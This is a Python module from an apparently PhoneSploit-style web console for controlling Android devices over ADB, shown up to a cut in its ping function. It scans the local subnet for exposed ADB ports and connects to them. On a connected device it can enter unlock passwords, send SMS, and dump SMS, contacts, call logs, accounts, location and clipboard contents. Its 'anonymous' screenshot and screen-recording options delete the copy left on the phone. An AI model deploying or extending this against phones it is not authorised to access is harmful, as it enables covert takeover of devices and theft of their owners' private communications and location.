"""Device and host operations for the web console.

Each function returns a JSON-ready dict: ok, message, data, artifact.
"""

from __future__ import annotations

import re
import threading
import time
from collections.abc import Callable
from datetime import datetime
from pathlib import Path
from typing import Any

from modules.connection import (
    _adb_port_summary,
    _android_hint,
    _port_scanner,
    _sort_ipv4,
    get_ip_address,
    is_valid_ipv4,
    list_local_ipv4,
)
from modules.device import (
    _format_mcc_mnc,
    _parse_accounts,
    _parse_bluetooth_devices,
    _plmns_from_prop,
)
from modules.mac_vendor import lookup_mac_vendor
from modules.security import PAYLOAD_NAME, PAYLOAD_PACKAGE
from modules.services.parse import (
    parse_battery,
    parse_content_rows,
    parse_devices_list,
    parse_location,
    parse_ls,
    parse_packages,
    parse_usage,
)
from modules.services.runner import (
    AdbError,
    CmdResult,
    command_failed,
    run,
    shell,
    shell_text,
    validate_package,
    validate_remote_path,
)
from modules.tools import scrcpy_argv
from modules.wifi_utils import _CMD_WIFI_LINE_RES, _DUMPSYS_RES, _ordered_unique

DOWNLOADS = Path("Downloaded-Files")
_clip_lock = threading.Lock()


def _ok(message: str = "Done.", data: Any = None, artifact: str | None = None) -> dict[str, Any]:
    return {"ok": True, "message": message, "data": data, "artifact": artifact}


def _fail(message: str, data: Any = None) -> dict[str, Any]:
    return {"ok": False, "message": message, "data": data, "artifact": None}


def _result(result: CmdResult, success: str) -> dict[str, Any]:
    if command_failed(result):
        return _fail(result.text or "Command failed.")
    return _ok(result.text or success, data={"output": result.text})


def _stamp() -> str:
    return datetime.now().strftime("%Y%m%d-%H%M%S")


def downloads_dir() -> Path:
    DOWNLOADS.mkdir(parents=True, exist_ok=True)
    return DOWNLOADS


def _save_text(name: str, text: str) -> str:
    path = downloads_dir() / name
    path.write_text(text, encoding="utf-8", errors="replace")
    return str(path)


def _require(params: dict[str, Any], key: str) -> str:
    value = str(params.get(key) or "").strip()
    if not value:
        raise AdbError(f"{key} is required.")
    return value


def _port(value: Any, label: str) -> str:
    raw = str(value or "").strip()
    if not raw.isdigit() or not 1 <= int(raw) <= 65535:
        raise AdbError(f"{label} must be a TCP port.")
    return raw


def _bool_param(value: Any) -> bool:
    return str(value).strip().lower() in ("1", "true", "on", "yes")


# ---------------------------------------------------------------------------
# Host
# ---------------------------------------------------------------------------

def list_devices_raw() -> list[dict[str, str]]:
    result = run(["devices", "-l"], timeout=15)
    return parse_devices_list(result.stdout)


def enrich_device(device: dict[str, str]) -> dict[str, Any]:
    item = dict(device)
    item["model"] = ""
    item["android"] = ""
    item["battery"] = ""
    if device.get("state") != "device":
        return item
    serial = device["serial"]
    try:
        item["model"] = shell_text(serial, "getprop", "ro.product.model", timeout=8)
        item["android"] = shell_text(serial, "getprop", "ro.build.version.release", timeout=8)
        battery = parse_battery(shell_text(serial, "dumpsys", "battery", timeout=8))
        item["battery"] = battery.get("level", "")
    except AdbError:
        pass
    return item


def list_devices() -> dict[str, Any]:
    devices = [enrich_device(device) for device in list_devices_raw()]
    return _ok(f"{len(devices)} device(s).", data={"devices": devices})


def connect_device(params: dict[str, Any]) -> dict[str, Any]:
    ip = _require(params, "ip")
    if not is_valid_ipv4(ip):
        return _fail("Invalid IPv4 address.")
    return _result(run(["connect", f"{ip}:5555"], timeout=20), f"Connecting to {ip}:5555")


def disconnect_all() -> dict[str, Any]:
    return _result(run(["disconnect"], timeout=20), "Disconnected.")


def stop_adb() -> dict[str, Any]:
    run(["kill-server"], timeout=20)
    return _ok("ADB server stopped.")


def restart_adb() -> dict[str, Any]:
    from modules.console import get_adb_executable

    exe = get_adb_executable()
    if not exe:
        return _fail("ADB executable not available.")
    import subprocess

    subprocess.run([exe, "kill-server"], capture_output=True)
    subprocess.run([exe, "start-server"], capture_output=True)
    return _ok("ADB server restarted.")


def wireless_pair(params: dict[str, Any]) -> dict[str, Any]:
    from modules.console import get_adb_executable
    import subprocess

    address = _require(params, "address")
    code = _require(params, "code")
    exe = get_adb_executable()
    if not exe:
        return _fail("ADB executable not available.")
    result = subprocess.run([exe, "pair", address, code], capture_output=True, text=True)
    out = (result.stdout + result.stderr).strip()
    if result.returncode == 0:
        return _ok(out or "Paired.")
    return _fail(out or "Pairing failed.")


def wireless_connect(params: dict[str, Any]) -> dict[str, Any]:
    address = _require(params, "address")
    if ":" not in address:
        address = f"{address}:5555"
    return _result(run(["connect", address], timeout=20), f"Connecting to {address}")


def wireless_tcpip(params: dict[str, Any]) -> dict[str, Any]:
    port = str(params.get("port") or "5555").strip()
    if not port.isdigit():
        return _fail("Port must be a number.")
    return _result(run(["tcpip", port], timeout=20), f"Listening on TCP {port}")


def wireless_usb() -> dict[str, Any]:
    return _result(run(["usb"], timeout=20), "Switched to USB.")


def local_interfaces() -> dict[str, Any]:
    return _ok("Interfaces.", data={"ips": list_local_ipv4(), "default": get_ip_address()})


_ADB_PROBE_ARGUMENTS = "-p 5555,5554 -sT -sV --version-intensity 1 -T4"


def _emit_scan(on_event: Callable[[dict[str, Any]], Any] | None, event: dict[str, Any]) -> None:
    if on_event is None:
        return
    try:
        on_event(event)
    except Exception:
        return


def _scan_host_row(host: str, host_data: dict[str, Any] | None) -> dict[str, str]:
    summary = _adb_port_summary(host_data) if host_data else ""
    return {"ip": host, "adb": summary or "", "hint": _android_hint(summary)}


def _probe_adb_host(config: Any, host: str) -> dict[str, Any] | None:
    """Port-scan one live host. A failed probe yields no fingerprint instead of aborting the sweep."""
    try:
        ports_scan = _port_scanner(config)
        ports_scan.scan(hosts=host, arguments=_ADB_PROBE_ARGUMENTS)
        if host in ports_scan.all_hosts():
            return ports_scan[host]
    except Exception:
        return None
    return None


def scan_network(
    config: Any,
    on_event: Callable[[dict[str, Any]], Any] | None = None,
    should_cancel: Callable[[], bool] | None = None,
) -> dict[str, Any]:
    ip = get_ip_address()
    if ip is None:
        return _fail("Could not detect a local IP address.")
    subnet = ip + "/24"
    _emit_scan(
        on_event,
        {
            "phase": "discover",
            "message": f"Discovering hosts on {subnet}",
            "progress": 0,
            "subnet": subnet,
            "hosts": [],
        },
    )
    discover = _port_scanner(config)
    discover.scan(hosts=subnet, arguments="-sn")
    hosts = [host for host in discover.all_hosts() if discover[host]["status"]["state"] == "up"]
    hosts = _sort_ipv4(hosts)
    rows: list[dict[str, str]] = []
    total = len(hosts)
    for index, host in enumerate(hosts, start=1):
        if should_cancel is not None and should_cancel():
            return _ok(
                f"Scan cancelled. {len(rows)} host(s) probed on {subnet}.",
                data={"subnet": subnet, "hosts": rows, "cancelled": True},
            )
        row = _scan_host_row(host, _probe_adb_host(config, host))
        rows.append(row)
        _emit_scan(
            on_event,
            {
                "phase": "probe",
                "index": index,
                "total": total,
                "progress": index / total,
                "message": f"Probed {host} ({index}/{total})",
                "host": row,
                "hosts": list(rows),
                "subnet": subnet,
            },
        )
    return _ok(
        f"{len(rows)} host(s) on {subnet}.",
        data={"subnet": subnet, "hosts": rows, "cancelled": False},
    )


# ---------------------------------------------------------------------------
# Device info
# ---------------------------------------------------------------------------

_INFO_PROPS = {
    "model": "ro.product.model",
    "manufacturer": "ro.product.manufacturer",
    "chipset": "ro.product.board",
    "android": "ro.build.version.release",
    "securityPatch": "ro.build.version.security_patch",
    "device": "ro.product.vendor.device",
    "simOperator": "gsm.sim.operator.alpha",
    "encryption": "ro.crypto.state",
    "buildDate": "ro.build.date",
    "sdk": "ro.build.version.sdk",
    "wifiInterface": "wifi.interface",
    "serial": "ro.serialno",
    "bootSerial": "ro.boot.serialno",
}


def device_info(serial: str) -> dict[str, Any]:
    props = {label: shell_text(serial, "getprop", prop) for label, prop in _INFO_PROPS.items()}
    props["androidId"] = shell_text(serial, "settings", "get", "secure", "android_id")
    return _ok("Device information.", data=props)


def battery_info(serial: str) -> dict[str, Any]:
    raw = shell_text(serial, "dumpsys", "battery")
    return _ok("Battery.", data={"props": parse_battery(raw), "raw": raw})


def accounts(serial: str) -> dict[str, Any]:
    raw = shell_text(serial, "dumpsys", "account")
    return _ok("Accounts.", data={"accounts": _parse_accounts(raw) if raw else []})


def sim_info(serial: str) -> dict[str, Any]:
    keys = {
        "simOperatorAlpha": "gsm.sim.operator.alpha",
        "simOperatorNumeric": "gsm.sim.operator.numeric",
        "simCountry": "gsm.sim.operator.iso-country",
        "networkOperatorAlpha": "gsm.operator.alpha",
        "networkOperatorNumeric": "gsm.operator.numeric",
        "networkCountry": "gsm.operator.iso-country",
    }
    values = {label: shell_text(serial, "getprop", prop) for label, prop in keys.items()}
    lookups = []
    for key in ("simOperatorNumeric", "networkOperatorNumeric"):
        for plmn in _plmns_from_prop(values.get(key) or ""):
            label = _format_mcc_mnc(plmn)
            if label:
                lookups.append({"source": key, "plmn": plmn, "label": label})
    return _ok("SIM.", data={"values": values, "lookups": lookups})


def bluetooth(serial: str) -> dict[str, Any]:
    raw = shell_text(serial, "dumpsys", "bluetooth_manager")
    if not raw.strip():
        raw = shell_text(serial, "dumpsys", "bluetooth")
    devices = _parse_bluetooth_devices(raw)
    for device in devices:
        device["vendor"] = lookup_mac_vendor(device.get("address", "")) or ""
    return _ok("Bluetooth.", data={"devices": devices})


def locale_read(serial: str) -> dict[str, Any]:
    rows = {
        "systemLocales": shell_text(serial, "settings", "get", "system", "system_locales"),
        "persistLocale": shell_text(serial, "getprop", "persist.sys.locale"),
        "productLocale": shell_text(serial, "getprop", "ro.product.locale"),
    }
    return _ok("Locale.", data=rows)


def location(serial: str) -> dict[str, Any]:
    raw = shell_text(serial, "dumpsys", "location", timeout=30)
    rows = parse_location(raw)
    if not rows:
        return _fail("No last-known location. Open a maps app once, then retry.")
    return _ok("Location.", data={"locations": rows})


def root_heuristics(serial: str) -> dict[str, Any]:
    props = {
        key: shell_text(serial, "getprop", key)
        for key in (
            "ro.build.type",
            "ro.build.tags",
            "ro.debuggable",
            "ro.secure",
            "service.adb.root",
            "ro.boot.flash.locked",
            "ro.boot.verifiedbootstate",
        )
    }
    checks = {
        "shellId": shell_text(serial, "sh", "-c", "id 2>/dev/null | head -1"),
        "whichSu": shell_text(serial, "sh", "-c", "which su 2>/dev/null"),
        "suBin": shell_text(serial, "sh", "-c", "ls -l /system/xbin/su /system/bin/su 2>/dev/null | head -2"),
        "magisk": shell_text(
            serial,
            "sh",
            "-c",
            "ls /data/adb/magisk/magisk 2>/dev/null; ls /sbin/magisk 2>/dev/null; which magisk 2>/dev/null",
        ),
        "magiskApp": shell(serial, "pm", "path", "com.topjohnwu.magisk").text,
    }
    return _ok("Root heuristics.", data={"props": props, "checks": checks})


# ---------------------------------------------------------------------------
# Power, input, radios, sound, display
# ---------------------------------------------------------------------------

def unlock(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    shell(serial, "input", "keyevent", "26")
    shell(serial, "input", "swipe", "200", "900", "200", "300", "200")
    password = str(params.get("password") or "")
    if password:
        shell(serial, "input", "text", password.replace(" ", "%s"))
    shell(serial, "input", "keyevent", "66")
    return _ok("Unlock sequence sent.")


def lock(serial: str) -> dict[str, Any]:
    shell(serial, "input", "keyevent", "26")
    return _ok("Lock key sent.")


def reboot(serial: str, target: str = "") -> dict[str, Any]:
    if target in ("recovery", "bootloader", "fastboot"):
        run(["reboot", target], serial=serial, timeout=15)
        return _ok(f"Rebooting to {target}.")
    run(["reboot"], serial=serial, timeout=15)
    return _ok("Rebooting.")


def power_off(serial: str) -> dict[str, Any]:
    shell(serial, "reboot", "-p", timeout=15)
    return _ok("Power off sent.")


def keyevent(serial: str, code: str, label: str) -> dict[str, Any]:
    shell(serial, "input", "keyevent", code)
    return _ok(label)


def key_text(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    text = _require(params, "text").replace(" ", "%s")
    shell(serial, "input", "text", text)
    return _ok("Text sent.")


def tap(serial: str, x: int, y: int) -> dict[str, Any]:
    shell(serial, "input", "tap", str(x), str(y))
    return _ok("Tap sent.")


def swipe(serial: str, x1: int, y1: int, x2: int, y2: int, duration: int = 200) -> dict[str, Any]:
    shell(serial, "input", "swipe", str(x1), str(y1), str(x2), str(y2), str(duration))
    return _ok("Swipe sent.")


def stay_on(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    target = _require(params, "target")
    if target not in ("usb", "true", "false"):
        return _fail("Stay-on target must be usb, true, or false.")
    return _result(shell(serial, "svc", "power", "stayon", target), "Stay-on updated.")


def _radio(serial: str, name: str, on: bool) -> dict[str, Any]:
    verb = "enable" if on else "disable"
    if name == "airplane":
        state = "1" if on else "0"
        flag = "true" if on else "false"
        shell(serial, "settings", "put", "global", "airplane_mode_on", state)
        result = shell(
            serial,
            "am",
            "broadcast",
            "-a",
            "android.intent.action.AIRPLANE_MODE",
            "--ez",
            "state",
            flag,
        )
        return _result(result, f"Airplane mode {'on' if on else 'off'}.")
    if name == "wifi":
        return _result(shell(serial, "svc", "wifi", verb), f"Wi-Fi {verb}d.")
    if name == "data":
        return _result(shell(serial, "svc", "data", verb), f"Mobile data {verb}d.")
    if name == "bluetooth":
        result = shell(serial, "svc", "bluetooth", verb)
        if command_failed(result):
            result = shell(serial, "cmd", "bluetooth_manager", verb)
        return _result(result, f"Bluetooth {verb}d.")
    if name == "nfc":
        return _result(shell(serial, "svc", "nfc", verb), f"NFC {verb}d.")
    return _fail("Unknown radio.")


def display_view(serial: str) -> dict[str, Any]:
    return _ok(
        "Display.",
        data={
            "size": shell(serial, "wm", "size").text,
            "density": shell(serial, "wm", "density").text,
        },
    )


def display_resolution(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    size = _require(params, "size")
    if size == "reset":
        return _result(shell(serial, "wm", "size", "reset"), "Resolution reset.")
    if not re.fullmatch(r"\d{3,5}x\d{3,5}", size):
        return _fail("Resolution must look like 1080x1920.")
    return _result(shell(serial, "wm", "size", size), f"Resolution set to {size}.")


def display_density(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    dpi = _require(params, "dpi")
    if dpi == "reset":
        return _result(shell(serial, "wm", "density", "reset"), "Density reset.")
    if not dpi.isdigit():
        return _fail("Density must be a number.")
    return _result(shell(serial, "wm", "density", dpi), f"Density set to {dpi}.")


def display_scaling(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    enabled = _require(params, "enabled")
    if enabled not in ("0", "1"):
        return _fail("Scaling must be 0 or 1.")
    return _result(shell(serial, "wm", "scaling", enabled), "Scaling updated.")


def display_reset(serial: str) -> dict[str, Any]:
    shell(serial, "wm", "size", "reset")
    shell(serial, "wm", "density", "reset")
    return _ok("Resolution and density reset.")


def volume_show(serial: str) -> dict[str, Any]:
    for args in (
        ["cmd", "media", "volume", "--show", "--stream", "3"],
        ["cmd", "media", "volume", "--get", "--stream", "3"],
    ):
        result = shell(serial, *args)
        if not command_failed(result) and result.text:
            return _ok("Volume.", data={"output": result.text})
    return _fail("Volume query is not supported on this ROM.")


def volume_set(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    level = _require(params, "level")
    if not level.isdigit() or not 0 <= int(level) <= 15:
        return _fail("Volume must be 0-15.")
    for args in (
        ["cmd", "media", "volume", "--stream", "3", "--set", level],
        ["cmd", "media_session", "volume", "--stream", "3", "--set", level],
    ):
        result = shell(serial, *args)
        if not command_failed(result):
            return _ok(result.text or f"Volume set to {level}.")
    return _fail("Volume control is not supported on this ROM.")


def brightness(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    raw = str(params.get("value") or "").strip()
    if not raw:
        return _result(shell(serial, "settings", "put", "system", "screen_brightness_mode", "1"), "Auto brightness on.")
    if not raw.isdigit() or not 0 <= int(raw) <= 255:
        return _fail("Brightness must be 0-255.")
    shell(serial, "settings", "put", "system", "screen_brightness_mode", "0")
    return _result(shell(serial, "settings", "put", "system", "screen_brightness", raw), "Brightness set.")


def screen_timeout(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    seconds = _require(params, "seconds")
    if not seconds.isdigit():
        return _fail("Timeout must be seconds.")
    millis = str(int(seconds) * 1000)
    return _result(
        shell(serial, "settings", "put", "system", "screen_off_timeout", millis),
        "Timeout set.",
    )


def dnd(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    mode = _require(params, "mode")
    if mode not in ("0", "1", "2", "3"):
        return _fail("Invalid Do Not Disturb mode.")
    return _result(shell(serial, "settings", "put", "secure", "zen_mode", mode), "Do Not Disturb updated.")


def notif_post(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    title = _require(params, "title")
    message = _require(params, "message")
    tag = f"phonesploit-{datetime.now().strftime('%H%M%S')}"
    return _result(
        shell(serial, "cmd", "notification", "post", "-S", "bigtext", "-t", title, tag, message),
        "Notification posted.",
    )


def statusbar(serial: str, action: str) -> dict[str, Any]:
    return _result(shell(serial, "cmd", "statusbar", action), "Status bar updated.")


def mock_level(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    level = _require(params, "level")
    if not level.isdigit() or not 0 <= int(level) <= 100:
        return _fail("Level must be 0-100.")
    return _result(shell(serial, "dumpsys", "battery", "set", "level", level), "Battery level set.")


def mock_unplug(serial: str) -> dict[str, Any]:
    return _result(shell(serial, "dumpsys", "battery", "unplug"), "Unplugged.")


def mock_plug(serial: str) -> dict[str, Any]:
    shell(serial, "dumpsys", "battery", "set", "ac", "1")
    shell(serial, "dumpsys", "battery", "set", "usb", "1")
    return _result(shell(serial, "dumpsys", "battery", "set", "status", "2"), "Charging simulated.")


def mock_reset(serial: str) -> dict[str, Any]:
    return _result(shell(serial, "dumpsys", "battery", "reset"), "Battery reset.")


def open_url(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    url = _require(params, "url")
    if not url.startswith(("http://", "https://")):
        return _fail("URL must start with http:// or https://.")
    return _result(
        shell(serial, "am", "start", "-a", "android.intent.action.VIEW", "-d", url),
        f"Opened {url}.",
    )


def send_sms(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    number = _require(params, "number")
    message = _require(params, "message")
    if not re.fullmatch(r"\+?[0-9]{6,16}", number):
        return _fail("Number must be digits, optional leading +.")
    result = shell(
        serial,
        "service",
        "call",
        "isms",
        "5",
        "i32",
        "0",
        "s16",
        "com.android.mms.service",
        "s16",
        "null",
        "s16",
        number,
        "s16",
        "null",
        "s16",
        message,
        "s16",
        "null",
        "s16",
        "null",
        "s16",
        "null",
        "s16",
        "null",
        timeout=20,
    )
    if result.returncode != 0:
        return _fail(result.text or "SMS failed. This path is Android-version specific.")
    return _ok(f"SMS submitted to {number}.", data={"output": result.text})


def developer(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    action = _require(params, "action")
    if action == "open":
        return _result(
            shell(
                serial,
                "am",
                "start",
                "-a",
                "android.settings.APPLICATION_DEVELOPMENT_SETTINGS",
            ),
            "Developer options opened.",
        )
    if action == "read":
        keys = [
            "animator_duration_scale",
            "transition_animation_scale",
            "window_animation_scale",
            "adb_enabled",
        ]
        values = {key: shell_text(serial, "settings", "get", "global", key) for key in keys}
        return _ok("Global settings.", data=values)
    if action == "write":
        key = _require(params, "key")
        if not re.fullmatch(r"[A-Za-z0-9_.]+", key):
            return _fail("Invalid settings key.")
        value = str(params.get("value") or "")
        return _result(shell(serial, "settings", "put", "global", key, value), "Setting written.")
    return _fail("Unknown developer action.")


# ---------------------------------------------------------------------------
# Apps and files
# ---------------------------------------------------------------------------

def list_apps(serial: str, third_party: bool = False) -> dict[str, Any]:
    args = ["pm", "list", "packages", "-3"] if third_party else ["pm", "list", "packages"]
    packages = parse_packages(shell_text(serial, *args, timeout=30))
    return _ok(f"{len(packages)} packages.", data={"packages": packages})


def _pkg(params: dict[str, Any]) -> str:
    return validate_package(_require(params, "package"))


def install_apk(serial: str, path: Path) -> dict[str, Any]:
    return _result(run(["install", "-r", str(path)], serial=serial, timeout=180), "Installed.")


def install_splits(serial: str, paths: list[Path]) -> dict[str, Any]:
    return _result(
        run(["install-multiple", "-r", *[str(path) for path in paths]], serial=serial, timeout=180),
        "Split APKs installed.",
    )


def uninstall_app(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    return _result(run(["uninstall", _pkg(params)], serial=serial, timeout=60), "Uninstalled.")


def launch_app(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    package = _pkg(params)
    shell(serial, "monkey", "-p", package, "1")
    return _ok(f"Launched {package}.")


def force_stop(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    package = _pkg(params)
    return _result(shell(serial, "am", "force-stop", package), f"Force-stopped {package}.")


def restart_app(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    package = _pkg(params)
    shell(serial, "am", "force-stop", package)
    shell(serial, "monkey", "-p", package, "1")
    return _ok(f"Restarted {package}.")


def clear_app(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    return _result(shell(serial, "pm", "clear", _pkg(params)), "App data cleared.")


def pm_state(serial: str, package: str, *args: str) -> dict[str, Any]:
    return _result(shell(serial, "pm", *args, package), "Updated.")


def grant_revoke(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    package = _pkg(params)
    permission = _require(params, "permission")
    if not permission.startswith("android.permission."):
        return _fail("Permission must start with android.permission.")
    verb = "grant" if str(params.get("grant") or "grant") == "grant" else "revoke"
    return _result(shell(serial, "pm", verb, package, permission), f"Permission {verb}ed.")


def battery_whitelist_show(serial: str) -> dict[str, Any]:
    return _ok("Whitelist.", data={"output": shell_text(serial, "cmd", "deviceidle", "whitelist")})


def battery_whitelist(serial: str, params: dict[str, Any], add: bool) -> dict[str, Any]:
    package = _pkg(params)
    flag = f"+{package}" if add else f"-{package}"
    return _result(shell(serial, "cmd", "deviceidle", "whitelist", flag), "Whitelist updated.")


def show_home(serial: str) -> dict[str, Any]:
    return _ok("Home app.", data={"output": shell_text(serial, "cmd", "package", "resolve-activity", "--brief", "-c", "android.intent.category.HOME", "-a", "android.intent.action.MAIN")})


def set_home(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    component = _require(params, "component")
    if not re.fullmatch(r"[A-Za-z0-9_.]+/[A-Za-z0-9_.$]+", component):
        return _fail("Component must look like com.example/.Main")
    return _result(
        shell(serial, "cmd", "package", "set-home-activity", "--user", "0", component),
        "Home app set.",
    )


def extract_apk(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    package = _pkg(params)
    raw = shell_text(serial, "pm", "path", package)
    paths = [line.replace("package:", "").strip() for line in raw.splitlines() if line.strip().startswith("package:")]
    if not paths:
        return _fail(f"App not found: {package}")
    remote = next((path for path in paths if path.endswith("base.apk")), paths[0])
    dest = downloads_dir() / f"{package.replace('.', '_')}.apk"
    result = run(["pull", remote, str(dest)], serial=serial, timeout=120)
    if result.returncode != 0:
        return _fail(result.text or "Pull failed.")
    return _ok(f"Saved {dest.name}.", artifact=str(dest))


def list_files(serial: str, path: str = "/sdcard") -> dict[str, Any]:
    remote = validate_remote_path(path or "/sdcard")
    result = shell(serial, "ls", "-1p", remote)
    if result.returncode != 0:
        return _fail(result.text or "Cannot list that path.")
    return _ok(remote, data={"path": remote, "entries": parse_ls(result.stdout)})


def pull_path(serial: str, remote: str) -> dict[str, Any]:
    remote = validate_remote_path(remote)
    dest_dir = downloads_dir() / f"pull-{_stamp()}"
    dest_dir.mkdir(parents=True, exist_ok=True)
    result = run(["pull", remote, str(dest_dir)], serial=serial, timeout=300)
    if result.returncode != 0:
        return _fail(result.text or "Pull failed.")
    return _ok(f"Pulled to {dest_dir.name}.", artifact=str(dest_dir))


def push_path(serial: str, local: Path, destination: str) -> dict[str, Any]:
    dest = destination.strip().strip("/") or ""
    remote = "/sdcard" if not dest else f"/sdcard/{dest}"
    validate_remote_path(remote if remote != "/sdcard" else "/sdcard/.")
    result = run(["push", str(local), remote], serial=serial, timeout=300)
    if result.returncode != 0:
        return _fail(result.text or "Push failed.")
    return _ok(f"Pushed to {remote}.")


def copy_remote_dir(serial: str, candidates: list[str], label: str) -> dict[str, Any]:
    found = ""
    for candidate in candidates:
        if shell(serial, "test", "-d", candidate).returncode == 0:
            found = candidate
            break
    if not found:
        return _fail(f"{label} folder was not found.")
    return pull_path(serial, found)


def screenshot(serial: str, anonymous: bool) -> dict[str, Any]:
    name = f"screenshot-{_stamp()}.png"
    remote = f"/sdcard/{name}"
    shell(serial, "screencap", "-p", remote, timeout=30)
    dest = downloads_dir() / name
    result = run(["pull", remote, str(dest)], serial=serial, timeout=30)
    if anonymous:
        shell(serial, "rm", remote)
    if result.returncode != 0 or not dest.is_file():
        return _fail(result.text or "Screenshot failed.")
    return _ok(f"Saved {name}.", artifact=str(dest))


def screenrecord(serial: str, seconds: int, anonymous: bool) -> dict[str, Any]:
    if seconds < 1 or seconds > 180:
        return _fail("Duration must be 1-180 seconds.")
    name = f"vid-{_stamp()}.mp4"
    remote = f"/sdcard/{name}"
    result = shell(serial, "screenrecord", "--time-limit", str(seconds), remote, timeout=seconds + 30)
    if result.returncode != 0:
        return _fail(result.text or "screenrecord failed.")
    dest = downloads_dir() / name
    pulled = run(["pull", remote, str(dest)], serial=serial, timeout=120)
    if anonymous:
        shell(serial, "rm", remote)
    if pulled.returncode != 0:
        return _fail(pulled.text or "Pull failed.")
    return _ok(f"Saved {name}.", artifact=str(dest))


def push_and_view(serial: str, local: Path, mime: str) -> dict[str, Any]:
    remote_name = local.name.replace(" ", "_")
    run(["push", str(local), f"/sdcard/{remote_name}"], serial=serial, timeout=120)
    return _result(
        shell(
            serial,
            "am",
            "start",
            "-a",
            "android.intent.action.VIEW",
            "-d",
            f"file:///sdcard/{remote_name}",
            "-t",
            mime,
        ),
        f"Opened {remote_name}.",
    )


def set_wallpaper(serial: str, local: Path) -> dict[str, Any]:
    remote = f"/sdcard/wallpaper-{_stamp()}{local.suffix.lower()}"
    pushed = run(["push", str(local), remote], serial=serial, timeout=60)
    if pushed.returncode != 0:
        return _fail(pushed.text or "Push failed.")
    return _result(
        shell(
            serial,
            "am",
            "start",
            "-a",
            "android.intent.action.ATTACH_DATA",
            "-d",
            f"file://{remote}",
            "-t",
            "image/*",
        ),
        "Wallpaper picker opened.",
    )


# ---------------------------------------------------------------------------
# Data, clipboard, network, ports
# ---------------------------------------------------------------------------

def _dump(serial: str, name: str, uri: str, projection: str) -> dict[str, Any]:
    result = shell(
        serial,
        "content",
        "query",
        "--uri",
        uri,
        "--projection",
        projection,
        timeout=60,
    )
    if result.returncode != 0:
        return _fail(result.text or "Dump failed.")
    filename = f"{name}-{_stamp()}.txt"
    path = _save_text(filename, result.stdout)
    return _ok(
        f"Saved {filename}.",
        data={"rows": parse_content_rows(result.stdout), "count": len(parse_content_rows(result.stdout))},
        artifact=path,
    )


def dump_sms(serial: str) -> dict[str, Any]:
    return _dump(serial, "sms", "content://sms/", "address:date:body")


def dump_contacts(serial: str) -> dict[str, Any]:
    return _dump(serial, "contacts", "content://contacts/phones/", "display_name:number")


def dump_calls(serial: str) -> dict[str, Any]:
    return _dump(serial, "calls", "content://call_log/calls", "name:number:duration:date")


def usage(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    window = str(params.get("window") or "1")
    days = {"1": 1, "7": 7}.get(window)
    cutoff = 0 if days is None else int((time.time() - days * 86400) * 1000)
    raw = shell_text(serial, "dumpsys", "usagestats", timeout=40)
    return _ok("Usage.", data={"entries": parse_usage(raw, cutoff)})


def _with_clipboard(serial: str):
    """Clipboard helper calls console.adb(). Bind it to this serial under a lock."""
    from modules import console
    from modules.services.runner import run as adb_run

    def bound(args: list[str], capture: bool = True) -> CmdResult:
        return adb_run(args, serial=serial, timeout=60)

    class _Patch:
        def __enter__(self):
            self._old = console.adb
            console.adb = bound  # type: ignore[assignment]
            return self

        def __exit__(self, *exc: object) -> None:
            console.adb = self._old

    return _Patch()


def clipboard_read(serial: str) -> dict[str, Any]:
    from modules.clipboard_helper import clip_get

    with _clip_lock, _with_clipboard(serial):
        content, err = clip_get()
    if err:
        return _fail(err)
    return _ok("Clipboard.", data={"text": content or ""})


def clipboard_set(serial: str, text: str) -> dict[str, Any]:
    from modules.clipboard_helper import clip_set

    with _clip_lock, _with_clipboard(serial):
        ok, err = clip_set(text)
    if not ok:
        return _fail(err or "Clipboard write failed.")
    return _ok("Clipboard updated.")


def wifi_status(serial: str) -> dict[str, Any]:
    return _ok("Wi-Fi status.", data={"output": shell_text(serial, "dumpsys", "wifi", timeout=30)[:12000]})


def wlan_ip(serial: str) -> dict[str, Any]:
    raw = shell_text(serial, "ip", "addr", "show", "wlan0")
    if not raw.strip():
        raw = shell_text(serial, "ip", "addr")
    return _ok("WLAN.", data={"output": raw})


def saved_wifi(serial: str) -> dict[str, Any]:
    chunks = [
        shell_text(serial, "cmd", "wifi", "list-networks"),
        shell_text(serial, "dumpsys", "wifi", timeout=30),
    ]
    found: list[str] = []
    for raw, patterns in ((chunks[0], _CMD_WIFI_LINE_RES), (chunks[1], _DUMPSYS_RES)):
        for pattern in patterns:
            found.extend(pattern.findall(raw))
    ssids = _ordered_unique(found)
    return _ok(f"{len(ssids)} saved network(s).", data={"ssids": ssids})


def nearby_wifi(serial: str) -> dict[str, Any]:
    scan = shell(serial, "cmd", "wifi", "start-scan")
    if command_failed(scan):
        return _fail(scan.text or "Wi-Fi scan is not supported.")
    time.sleep(2)
    raw = shell_text(serial, "cmd", "wifi", "list-scan-results", timeout=20)
    from modules.wifi_utils import _parse_scan_results

    rows = _parse_scan_results(raw)
    for row in rows:
        row["vendor"] = lookup_mac_vendor(row.get("bssid", "")) or ""
    return _ok(f"{len(rows)} network(s).", data={"networks": rows, "raw": raw[:4000]})


def hotspot(serial: str, start: bool) -> dict[str, Any]:
    verb = "start-local-only-hotspot" if start else "stop-local-only-hotspot"
    return _result(shell(serial, "cmd", "wifi", verb), "Hotspot updated.")


def ping(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    host = str(params.get("host") or "8.8.8.8").strip()
    if not re.fullmatch(r"[A-Za-z0-9.\-]{1,253}", host):
        return _fail("Invalid host.")
